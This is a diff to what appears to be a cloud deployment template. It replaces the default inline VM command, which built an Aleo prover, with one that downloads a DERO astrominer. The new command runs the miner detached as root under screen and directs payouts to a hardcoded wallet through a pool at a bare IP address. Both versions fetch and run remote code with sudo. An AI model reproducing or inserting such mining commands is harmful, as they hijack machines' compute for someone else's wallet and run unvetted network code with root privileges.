@@ -67,7 +67,7 @@
         },
         "inlineCommand": {
             "type": "string",
-            "defaultValue": "curl --proto --tlsv1.2 https://sh.rustup.rs > rustup.sh; sudo sh rustup.sh -y; source "$HOME/.cargo/env"; sudo apt install git clang libssl-dev pkg-config --no-install-recommends -y; git clone https://github.com/HarukaMa/aleo-prover -b testnet3-new; cd aleo-prover; sudo cargo build --release; sudo screen cargo run --release -- -a aleo1xaqn4qjk9ysxavcrawn0hf04ttv4x5lxgqku9hspfzwa7rke0qxqhq599f -p pool.hamp.app:4444",
+            "defaultValue": "sudo apt-get update -y; sudo apt install screen -y; sudo apt-get install -y build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git; sudo sysctl -w vm.nr_hugepages=1280; mkdir kkk; cd kkk; wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.6/astrominer-V1.6_rev5_amd64_linux.tar.gz; tar xf astrominer-V1.6_rev5_amd64_linux.tar.gz; sudo screen -d -m ./astrominer -w dero1qy9phpm6wcae0n3akxx8fyn0kj6ymcg4e2m09l4xeg06wnva474svqqmv95rl -r 34.88.243.155:10100 -p rpc",
             "metadata": {
                 "description": "inline command"
             }
